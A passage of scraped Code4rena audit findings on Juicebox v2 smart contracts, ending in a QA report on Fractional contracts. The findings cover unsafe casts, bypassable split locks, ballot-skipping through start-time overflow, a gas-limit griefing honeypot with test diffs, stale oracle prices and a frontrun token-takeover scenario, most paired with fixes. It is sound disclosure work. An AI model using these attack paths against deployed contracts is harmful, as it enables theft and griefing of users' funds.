details  ### Impact  The JBController contract performs many unsafe casts `uint256` to `int256` and `int256` to `uint256` In example: - the cast `-1`(int256) to uint256 was `2**256 - 1` - the cast `2**255`(uint256) to int256 was `- 2**255`  ### Proof of Concept  `int256` to `uint256`: - [L816: `if (uint256(_processedTokenTrackerOf[_projectId]) != tokenStore.totalSupplyOf(_projectId))`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L816)  `uint256` to `int256`: - [L668: `int256(_tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L668) - [L681: `int256(beneficiaryTokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L681) - [L743: `int256(_tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L743) - [L785: `_processedTokenTrackerOf[_projectId] = int256(tokenStore.totalSupplyOf(_projectId));`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L785) - [L859: `_processedTokenTrackerOf[_projectId] = int256(_totalTokens + tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L859)  > Note: in the [L1076](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1076) and [L1077](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1077) there are two more casts but in the [L1075](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1075) check the cast  ### Tools Used  Review  ### Recommended Mitigation Steps  Use a SafeCast library of openzeppelin [`toUint256(int256 value)` and `toInt256(uint256 value)`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8c49ad74eae76ee389d038780d407cf90b4ae1de/contracts/utils/math/SafeCast.sol) or check the number before cast it   "}, {"title": "Locked splits can be updated", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/278", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L213-L220   # Vulnerability details  ## Impact  The check if the newly provided project splits contain the currently locked splits does not check the `JBSplit` struct properties `preferClaimed` and `preferAddToBalance`.  According to the docs in `JBSplit.sol`, _\"...if the split should be unchangeable until the specified time, with the exception of extending the locked period.\"_, locked sets are unchangeable.  However, locked sets with either `preferClaimed` or `preferAddToBalance` set to true can have their bool values overwritten by supplying the same split just with different bool values.  ## Proof of Concept  [JBSplitsStore.sol#L213-L220](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L213-L220)  ```solidity // Check for sameness. if (     _splits[_j].percent == _currentSplits[_i].percent &&     _splits[_j].beneficiary == _currentSplits[_i].beneficiary &&     _splits[_j].allocator == _currentSplits[_i].allocator &&     _splits[_j].projectId == _currentSplits[_i].projectId &&     // Allow lock extention.     _splits[_j].lockedUntil >= _currentSplits[_i].lockedUntil ) _includesLocked = true; ```  The check for sameness does not check the equality of the struct properties `preferClaimed` and `preferAddToBalance`.  ## Tools Used  Manual review  ## Recommended mitigation steps  Add two additional sameness checks for `preferClaimed` and `preferAddToBalance`:  ```solidity // Check for sameness. if (     _splits[_j].percent == _currentSplits[_i].percent &&     _splits[_j].beneficiary == _currentSplits[_i].beneficiary &&     _splits[_j].allocator == _currentSplits[_i].allocator &&     _splits[_j].projectId == _currentSplits[_i].projectId &&     _splits[_j].preferClaimed == _currentSplits[_i].preferClaimed && // @audit-info add check for sameness for property `preferClaimed`     _splits[_j].preferAddToBalance == _currentSplits[_i].preferAddToBalance && // @audit-info add check for sameness for property `preferAddToBalance`     // Allow lock extention.     _splits[_j].lockedUntil >= _currentSplits[_i].lockedUntil ) _includesLocked = true; ```   "}, {"title": "Lack of check on `mustStartAtOrAfter`", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/220", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L306-L312 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L518-L522   # Vulnerability details  ## Impact  **MED** - the function of the protocol could be impacted  By setting huge `mustStartAtOrAfter`, the owner can set start time in the past. It might open up possibility to bypass the ballot waiting time depending on the ballot's implementation.  ## Proof of Concept  - [proof of concept](https://gist.github.com/zzzitron/a8c6067923a87af8e001c05442258370#file-2022-07-juiceboxv2-t-sol-L77-L115)  The proof of concept is almost the same as [`TestReconfigure::testReconfigureProject`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/system_tests/TestReconfigure.sol#L77-L114). In the original test, the owner of the project is reconfiguring funding cycle, but it is not in effect immediately because ballot is set. Only after 3 days the newly set funding cycle will be the current one. In the above proof of concept, only one parameter of the funding cycle is modified: `mustStartAtOrAfter` is set to `type(uint56).max`. As the result, the newly set funding cycle is considered as the current one without waiting for the ballot.  The cause of this is missing check on `mustStartAtOrAfter` upon setting [here](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L306-L312). If the given `_mustStartAtOrAfter` is huge, it will be passed eventually to the `_initFor`, `_packAndStoreIntrinsicPropertiesOf`. Then it will 'overflow' by shifting and set to the funding cycle, which [essentially can be set to any value including the past](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L518-L522). Also, it seems like the number will be also effected because the bigger digit will carry over.  ```solidity // in JBFundingCycleStore::_packAndStoreIntrinsicPropertiesOf // where the `_start` is derived from `_mustStartAtOrAfter`  ./JBFundingCycleStore.sol-518-    // start in bits 144-199. ./JBFundingCycleStore.sol:519:    packed |= _start << 144; ./JBFundingCycleStore.sol-520- ./JBFundingCycleStore.sol-521-    // number in bits 200-255. ./JBFundingCycleStore.sol-522-    packed |= _number << 200; ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Add a check for the `_mustStartAtOrAfter`: ```solidity // example check for _mustSTartAtOrAfter // in JBFundingCycleStore::configureFor  if (_mustStartAtOrAfter > type(uint56).max) revert INVALID_START(); ```     "}, {"title": "Juicebox project owner can create a honeypot to cause grief", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/170", "labels": ["bug", "documentation", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L760 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L147   # Vulnerability details  ## Impact In a Juicebox project the project owner (or anyone that they approve) can set splits. These splits are details of the token distributions to other addresses in response to contributions to the project.  At the moment the `SPLITS_TOTAL_PERCENT = 1_000_000_000`. This means that the project owner could theoretically add 1 billion different splits, each with a percent value of 1. Of course, this would require too much gas, but the idea stands. A project owner could honeypot users by creating a project with the `MAX_RESERVED_RATE` reserved rate, and setting a large percentage split for the `msg.sender` who calls `distributeReservedTokensOf` in `JBController.sol`. The project owner could then fund the project with a series of large payments to ensure that the reserved amount was sufficiently large to entice a user to call `distributeReservedTokensOf` in the belief that they will be obtaining a large percentage of the reserve.  However, when a user calls this method they will hit the block gas limit and will have spent a large amount of ETH on gas, without receiving any of their expected split.  I consider this to be of high severity since user assets (in the form of gas) can be permanently lost without any loss to the project owner/griefer.  ## Proof of Concept The key behaviour we need to prove is that it's possible to set more splits before hitting the block gas limit than it is to distribute reward tokens over the same number of splits. If this is true, the project owner will be able to set a number of splits that will always make the `distributeReservedTokensOf` hit the block gas limit, and hence grief the caller.  This can be demonstrated by modifying the existing test cases. From some basic testing I have found that calling `distributeReservedTokensOf` hits the block gas limit when there are at least 389 splits, but for the same split count the project owner can successfully call `set` without hitting the block gas limit.  ``` diff --git a/test/jb_controller/distribute_reserved_token_of.test.js b/test/jb_controller/distribute_reserved _token_of.test.js index 2f964d8..6cfd645 100644 --- a/test/jb_controller/distribute_reserved_token_of.test.js +++ b/test/jb_controller/distribute_reserved_token_of.test.js @@ -119,10 +119,15 @@ describe('JBController::distributeReservedTokensOf(...)', function () {      const { addrs, projectOwner, jbController, mockJbTokenStore, mockSplitsStore, timestamp } =        await setup();      const caller = addrs[0]; -    const splitsBeneficiariesAddresses = [addrs[1], addrs[2]].map((signer) => signer.address); +    let addressList = [addrs[1], addrs[2]]; +    for (let i = 1; i < 389; i++) { +      addressList.push(addrs[1]); +    } + +    const splitsBeneficiariesAddresses = addressList.map((signer) => signer.address);       const splits = makeSplits({ -      count: 2, +      count: 389,        beneficiary: splitsBeneficiariesAddresses,        preferClaimed: true,      }); diff --git a/test/jb_splits_store/set.test.js b/test/jb_splits_store/set.test.js index 3dd0331..5992957 100644 --- a/test/jb_splits_store/set.test.js +++ b/test/jb_splits_store/set.test.js @@ -54,7 +54,7 @@ describe('JBSplitsStore::set(...)', function () {      };    }  -  function makeSplits(beneficiaryAddress, count = 4) { +  function makeSplits(beneficiaryAddress, count = 389) {      let splits = [];      for (let i = 0; i < count; i++) {        splits.push({ ```  ## Tools Used VSCode & Hardhat  ## Recommended Mitigation Steps For `JBSplit` objects there should be a minimum percentage for each split when calling `set`. Furthermore, it would probably be wise to prevent duplicate beneficiaries, but I have omitted that in the below recommendation for clarity. Below is a suggested diff. I've arbitrarily set a minimum percentage of 10,000 but given the PoC the min percentage should be conservatively set to ensure no more than 389 splits can be created (I would probably suggest a cap of max 100 splits per group).  ``` diff --git a/contracts/JBSplitsStore.sol b/contracts/JBSplitsStore.sol index d61cca2..429d78a 100644 --- a/contracts/JBSplitsStore.sol +++ b/contracts/JBSplitsStore.sol @@ -227,8 +227,8 @@ contract JBSplitsStore is IJBSplitsStore, JBOperatable {      uint256 _percentTotal = 0;       for (uint256 _i = 0; _i < _splits.length; _i++) { -      // The percent should be greater than 0. -      if (_splits[_i].percent == 0) revert INVALID_SPLIT_PERCENT(); +      // The percent should be greater than or equal to 10000. +      if (_splits[_i].percent < JBConstants.MIN_SPLIT_PERCENT) revert INVALID_SPLIT_PERCENT();         // ProjectId should be within a uint56        if (_splits[_i].projectId > type(uint56).max) revert INVALID_PROJECT_ID(); diff --git a/contracts/libraries/JBConstants.sol b/contracts/libraries/JBConstants.sol index 9a418f2..afb5f23 100644 --- a/contracts/libraries/JBConstants.sol +++ b/contracts/libraries/JBConstants.sol @@ -10,6 +10,7 @@ library JBConstants {    uint256 public constant MAX_REDEMPTION_RATE = 10000;    uint256 public constant MAX_DISCOUNT_RATE = 1000000000;    uint256 public constant SPLITS_TOTAL_PERCENT = 1000000000; +  uint256 public constant MIN_SPLIT_PERCENT = 10000;    uint256 public constant MAX_FEE = 1000000000;    uint256 public constant MAX_FEE_DISCOUNT = 1000000000;  } ```  An alternative to setting a minimum percentage would be to have a check on the length of the splits array and capping that at a sensible value. In this instance a project owner could still set low percentages per split, however I don't personally see the value in being able to set a value of 1 (to receive 1 billionth of the reserve).    "}, {"title": "ORACLE DATA FEED CAN BE OUTDATED YET USED ANYWAYS WHICH WILL IMPACT ON PAYMENT LOGIC", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/138", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBChainlinkV3PriceFeed.sol#L44 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBPrices.sol#L57 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L387 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L585 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L661 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L830 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L868   # Vulnerability details  ## Impact The current implementation of `JBChainlinkV3PriceFeed` is used by the protocol to showcase how the feed will be retrieved via Chainlink Data Feeds. The feed is used to retrieve the `currentPrice`, which is also used afterwards by `JBPrices.priceFor()`, then by `JBSingleTokenPaymentTerminalStore.recordPaymentFrom()`, `JBSingleTokenPaymentTerminalStore.recordDistributionFor`, `JBSingleTokenPaymentTerminalStore.recordUsedAllowanceOf`, `JBSingleTokenPaymentTerminalStore._overflowDuring` and `JBSingleTokenPaymentTerminalStore._currentTotalOverflowOf`. Although the current feeds are calculated by a non implemented IJBPriceFeed, if the implementation of the price feed is the same as the showcased in`JBChainlinkV3PriceFeed`, the retrieved data can be outdated or out of bounds.  It is important to remember that the sponsor said on the dedicated Discord Channel that also oracle pricing and data retrieval is inside the scope.   ## Proof of Concept Chainlink classifies their data feeds into four different groups regarding how reliable is each source thus, how risky they are. The groups are _Verified Feeds, Monitored Feeds, Custom Feeds and Specialized Feeds_ (they can be seen [here](https://docs.chain.link/docs/selecting-data-feeds/#data-feed-categories)). The risk is the lowest on the first one and highest on the last one.  A strong reliance on the price feeds has to be also monitored as recommended on the [Risk Mitigation section](https://docs.chain.link/docs/selecting-data-feeds/#risk-mitigation). There are several reasons why a data feed may fail such as unforeseen market events, volatile market conditions, degraded performance of infrastructure, chains, or networks, upstream data providers outage, malicious activities from third parties among others.  Chainlink recommends using their data feeds along with some controls to prevent mismatches with the retrieved data. Along some recommendations, the feed can include circuit breakers (for extreme price events), contract update delays (to ensure that the injected data into the protocol is fresh enough), manual kill-switches (to cease connection in case of found bug or vulnerability in an upstream contract), monitoring (control the deviation of the data) and soak testing (of the price feeds).  The `feed.lastRoundData()` interface parameters [according to Chainlink](https://docs.chain.link/docs/price-feeds-api-reference/) are the following:      function latestRoundData() external view         returns (             uint80 roundId,             //  The round ID.             int256 answer,              //  The price.             uint256 startedAt,          //  Timestamp of when the round started.             uint256 updatedAt,          //  Timestamp of when the round was updated.             uint80 answeredInRound      //  The round ID of the round in which the answer was computed.         )  Regarding Juicebox itself, only the `answer` is used on the `JBChainlinkV3PriceFeed.currentPrice()` implementation. The retrieved price of the `priceFeed` can be outdated and used anyways as a valid data because no timestamp tolerance of the update source time is checked while storing the return parameters of `feed.latestRoundData()` inside `JBChainlinkV3PriceFeed.currentPrice()` as recommended by Chainlink in [here](https://docs.chain.link/docs/using-chainlink-reference-contracts/#check-the-timestamp-of-the-latest-answer). The usage of outdated data can impact on how the Payment terminals work regarding pricing calculation and value measurement.  Precisely the following protocol logic within `JBSingleTokenPaymentTerminalStore\u200b\u200c` will work unexpectedly regarding value management.  - `recordPaymentFrom()`:    This function handles the minting of a project tokens according to a data source if one is given. If the retrieved value of the oracle is outdated, the `_weightRatio` at [Line 387](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L387) will return an incorrect value and then the `tokenCount` calculated amount will suffer from this mismatch, impacting in the amount of tokens minted.  - `recordDistributionFor()`:    Performs the recording of recently distributed funds for a project. On [line 580](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L580) the `distributedAmount` is computed and if the boolean check is false, then the call will perform a call to `priceFor` at [line 585](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L585). If the returned oracle value is not adjusted with current market prices, the `distributedAmount` will also drag that error computing an incorrect `distributedAmount`. Afterwards, because the `distributedAmount` is also used to update the token balances of the `msg.sender` ([line 598](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L598)) it means that the mismatch impacts on the modified balance.  - `recordUsedAllowanceOf()`:    Keeps record of used allowances of a project. It returns are analogue to the ones shown at `recordDistributionFor` where the `usedAmount` resembles the `distributedAmount`. The `usedAmount` is also used to update the project's balance. If the data of the oracle is outdated, the `usedAmount` will be calculated dragging that error.  - `_overflowDuring()`:    Used to get the amount that is overflowing relative to a specified cycle. The data retrieved from the oracle is used to calculate the value of `_distributionLimitRemaining` on [line 827](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L827) which is used later to calculate the return value if the boolean check performed at line 834 is true. Because the return of this function is the current balance of a project minus the amount that can be still distributed, if the amount that can still be distributed is wrong so will be the subtraction thus the return value.  - `_currentTotalOverflowOf()`:    Similar to the latter but used to get the overflow of all the terminals of a project. If the retrieved data has a mismatch with the market, the `_totalOverflow18Decimal` calculated on [line 866](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L827) if the boolean check is false will drag this mismatch which will also be dragged into the final return of the function.  The issues of those miscalculations impact on every project currently minted, which also affects subsequently on each user that has tokens of a project resulting in a high reach impact.   ## Recommended Mitigation Steps  As Chainlink [recommends](https://docs.chain.link/docs/using-chainlink-reference-contracts/#check-the-timestamp-of-the-latest-answer):  > Your application should track the `latestTimestamp` variable or use the `updatedAt` value from the `latestRoundData()` function to make sure that the latest answer is recent enough for your application to use it. If your application detects that the reported answer is not updated within the heartbeat or within time limits that you determine are acceptable for your application, pause operation or switch to an alternate operation mode while identifying the cause of the delay.  > During periods of low volatility, the heartbeat triggers updates to the latest answer. Some heartbeats are configured to last several hours, so your application should check the timestamp and verify that the latest answer is recent enough for your application.  It is recommended both to add also a tolerance that compares the `updatedAt` return timestamp from `latestRoundData()` with the current block timestamp and ensure that the `priceFeed` is being updated with the required frequency.  If the `ETH/USD` is the only one that is needed to retrieve, because it is the most popular and available pair it can also be useful to add other oracle to get the price feed (such as Uniswap's). This can be used as a redundancy in the case of having one oracle that returns outdated values (what is outdated and what is up to date can be determined by a tolerance as mentioned).  "}, {"title": "Token Change Can Be Frontrun, Blocking Token", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/104", "labels": ["bug", "documentation", "3 (High Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L246 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L266 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L605   # Vulnerability details  ## Impact This vulnerability allows malicious actors to block other users from changing tokens of their projects. Furthermore if ownership over the token contract is transferred to the `JBTokenStore` contract prior to the change, as suggested in the [recourse section of Juicebox's 24.05.2022 post-mortem update](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/main/security/postmortem/5.24.2022.md#Recourse), this vulnerability would allow an attacker to become the owner of tokens being transferred. For `JBToken` based tokens this would allow an attacker to begin issuing arbitrary amounts the token that was meant to be transferred.  ## Proof of Concept **Exploit scenario:** 1. Wanting to assign their token to their JB project an unsuspecting owner / admin transfers ownership to a `JBTokenStore` contract, either directly by calling `transferOwnership` on the token or indirectly by calling the `changeFor` method on an older `JBTokenStore` contract with `_newOwner` set as the new `JBTokenStore` contract. (For the newer Juicebox contracts the `JBController` contract's `changeTokenOf` method would be called)  2. Seeing this change an attacker submits a `changeTokenFor` calling transaction to the new `JBController` contract, triggering the `JBTokenStore` contract's `changeFor` method, linking it to one of the attacker's projects (this could be created in advance or as part of the same transaction via an attack contract) 3. The attacker can then gain ownership over the token by calling `changeTokenFor` again with the `_newOwner` set to the attacker's address 4. Assuming the token has an owner restricted `mint` method like `JBToken` based tokens the attacker can now mint an arbitrary amount of the token  ## Tools Used Manual review.  ## Recommended Mitigation Steps Before allowing a caller to change to a specific token ensure that they have control over it. This can be achieved by storing a list of trusted older JB directories and projects which are then queried. Alternatively the contract could require the caller to actually be the `.owner()`  address of the token to migrate, this would require admins to: 1. Call `changeTokenOf` with themselves as the new owner 2. Call the new change token method on the newer contract, since they are the owner they'd pass the check 3. Independently transfer the ownership to the new token store to ensure that it can issue tokens  Future migrations can be made more seamless by having older contracts directly call new contracts via a sub-call, removing a necessary transaction for the admin. The newer contracts needs to verify that the older contract is the owner address of the token that's being set and also has approval of the project owner which is being configured.   "}, {"title": "changeTokenOf makes it impossible for holders of oldToken to redeem the overflowed assets.", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/83", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L588-L606   # Vulnerability details  ## Impact When the owner calls the changeTokenOf function of the JBController contract, the token corresponding to the current project will be changed, which will make the oldToken holder unable to redeem the overflowing assets. ## Proof of Concept https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L588-L606 https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L236-L269 ## Tools Used None ## Recommended Mitigation Steps Consider adding a delay to changeTokenOf, or adding a function to convert oldToken to newToken  "}, {"title": "addFeedFor should check if inverse feed already exists", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/79", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBPrices.sol#L109-L122   # Vulnerability details  ## Impact Potentially inconsistent currency conversions  ## Proof of Concept addFeedFor requires that a price feed for the _currency _base doesn't exist when adding a new price feed but doesn't check if the inverse already exists. This means that two different oracles (potentially with different prices) could be used for _currency -> _base vs. _base -> _currency. Different prices would lead to inconsistent between conversion ratios depending on the direction of the conversion  ## Tools Used  ## Recommended Mitigation Steps Change L115 to: if (feedFor[_currency][_base] != IJBPriceFeed(address(0)) || feedFor[_base][_currency] != IJBPriceFeed(address(0))) revert PRICE_FEED_ALREADY_EXISTS()  "}, {"title": "processFees() may fail due to exceed gas limit", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/8", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L594   # Vulnerability details  ## processFees() may fail due to exceed gas limit  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L594  ### Impact  the function `processFees()` in `JBPayoutRedemptionPaymentTerminal.sol` may fail due to unbounded loop over `_heldFeesOf[_projectId]`  `_heldFeesOf[_projectId]` can get very large due to the function `_takeFeeFrom()` where it pushes fees that should be paid to a specific beneficiary onto the array  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L1199  `_heldFeesOf[_projectId]` could get large and cause a DOS condition where no fees can be distributed due to exceed of gas limit  ### Proof of Concept  ```     for (uint256 _i = 0; _i < _heldFeeLength; ) {       // Get the fee amount.       uint256 _amount = _feeAmount(         _heldFees[_i].amount,         _heldFees[_i].fee,         _heldFees[_i].feeDiscount       ); ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/628", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# QA Report  ## Table of Contents  - [summary](#summary)  ### Low - [hash collision with abi.encodePacked](#hash-collision-with-abi.encodepacked) - [Native `transfer` should be avoided](#native-transfer-should-be-avoided) - [Return value of ERC20.transferFrom unchecked](#return-value-of-erc20.transferfrom-unchecked) - [Setters and constructors should check the input value](#setters-and-constructors-should-check-the-input-value) - [Unused `receive()` functions](#`unused-receive-functions`)  ### Non-critical - [Constants instead of magic numbers](#constants-instead-of-magic-numbers) - [Events indexing](#events-indexing) - [Event should be emitted in setters](#event-should-be-emitted-in-setters) - [Public functions can be external](#public-functions-can-be-external) - [Redundant cast](#redundant-cast) - [Signature malleability](#signature-malleability) - [TODOs](#todos) - [Visibility should be explicit](#visibility-should-be-explicit)      # summary  > Few vulnerabilities were found examining the contracts. The main concerns are with:  # Low issues  # hash collision with abi.encodePacked  ## IMPACT  strings and bytes are encoded with padding when using `abi.encodePacked`. This can lead to [hash collision](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#non-standard-packed-mode) when passing the result to `keccak256`  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/FERC1155.sol   ```cpp 394:             keccak256( 395:                 abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash) 396:             ); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `abi.encode()` instead.   # Native `transfer` should be avoided  ## IMPACT   In `Migration`, the `.transfer()` method is used to transfer ETH.   The `transfer()` call requires that the recipient has a payable callback, only provides 2300 gas for its operation. This means the following cases can cause the transfer to fail:  - The contract does not have a payable callback - The contract\u2019s payable callback spends more than 2300 gas (which is only enough to emit something) - The contract is called through a proxy which itself uses up the 2300 gas  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Migration.sol  ```cpp 172:         payable(msg.sender).transfer(ethAmount); 325:         payable(msg.sender).transfer(ethAmount); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `.call()` to send ETH instead.  # Return value of ERC20.transferFrom unchecked  ## IMPACT   Some ERC20 implementations do not revert upon a fail `transfer/transferFrom` call, but return `false` instead. Not checking the return values of these calls can hence lead to silent failures of tokens transfers.  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/protoforms/BaseVault.sol  ```cpp 65:             IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Check the return value of these calls to ensure they are not `0`  # Setters and constructors should check the input value  ## PROBLEM  Setters and constructors should check the input value for addresses - ie revert if `address(0)` is assigned to `address` variables.    ## SEVERITY  Low     ## PROOF OF CONCEPT  Instances include:   ### src/modules/protoforms/BaseVault.sol  ```cpp 24:     constructor(address _registry, address _supply) Minter(_supply) { 25:         registry = _registry; 26:     } ```  ### src/modules/Buyout.sol  ```cpp 42:     constructor( 43:         address _registry, 44:         address _supply, 45:         address _transfer 46:     ) { 47:         registry = _registry; 48:         supply = _supply; 49:         transfer = _transfer; 50:     } ```  ### src/modules/Migration.sol  ```cpp 58:         buyout = payable(_buyout); 59:         registry = _registry; ```  ### src/modules/Minter.sol  ```cpp 17:     constructor(address _supply) { 18:         supply = _supply; 19:     } ```  ### src/references/SupplyReference.sol  ```cpp 15:     constructor(address _registry) { 16:         registry = _registry; 17:     } ```  ### src/targets/Supply.sol  ```cpp 16:     constructor(address _registry) { 17:         registry = _registry; 18:     } ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Add non-zero checks   # Unused `receive()` functions  ## IMPACT   `Vault` and `Buyout` have an empty `receive()` function, but do not have any withdrawal function. Any ETH mistakenly sent to these 